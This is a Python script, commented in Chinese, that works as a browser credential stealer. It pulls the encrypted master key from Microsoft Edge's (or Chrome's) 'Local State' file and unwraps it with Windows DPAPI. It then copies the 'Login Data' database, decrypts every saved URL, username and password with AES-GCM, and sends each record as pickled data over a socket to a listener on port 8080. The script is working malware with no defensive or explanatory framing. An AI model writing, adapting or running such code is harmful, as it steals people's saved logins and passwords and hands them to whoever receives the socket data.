import base64
import shutil
from socket import *
import os
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import sqlite3
import pickle

s = socket()  # 申请连接的socket
s.connect((gethostname(), 8080))
# 找密钥
local_path = os.getenv('LOCALAPPDATA')
# 微软/谷歌浏览器  用户数据路径
google_path = local_path + '\\Microsoft\\Edge\\User Data' # '\\Google\\Chrome\\User Data'
# 密钥所在文件路径
key_path = google_path + '\\Local State'
# 读取里面数据
text = open(key_path, 'r', encoding='utf-8').read()
JSON = json.loads(text)  # 转化为json数据
key = JSON['os_crypt']['encrypted_key']   # 提取密钥
key = base64.b64decode(key)  # base64解码
key = CryptUnprotectData(key[5:], None, None, None, 0)[1]  # DPAPI解码
# 找账号密码的密文
psd_path = google_path + '\\Default\\Login Data'  # 这个文件需要读写权限
shutil.copy(psd_path, 'Login Data')           # 拷贝出来
connect = sqlite3.connect('Login Data')           # 连接文件
cursor = connect.cursor()                         # 准备一个读写指针
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for data in cursor.fetchall():
    print(data)
    psd = data[2]
    # 破解密文
    iv = psd[3:15]
    payload = psd[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    password = cipher.decrypt(payload)
    # password = password[:-16].decode()
    try:
        password = password[:-16].decode()
    except UnicodeDecodeError:
        password = '解码失败'
    print(password)
    # 网址data[0] 账号 data[1] 密码 password
    # 数据发送
    s.send('1'.encode())
    s.recv(1024)
    data_list = [data[0],data[1],password]
    s.send(pickle.dumps(data_list))
    s.recv(1024)
s.send('0'.encode())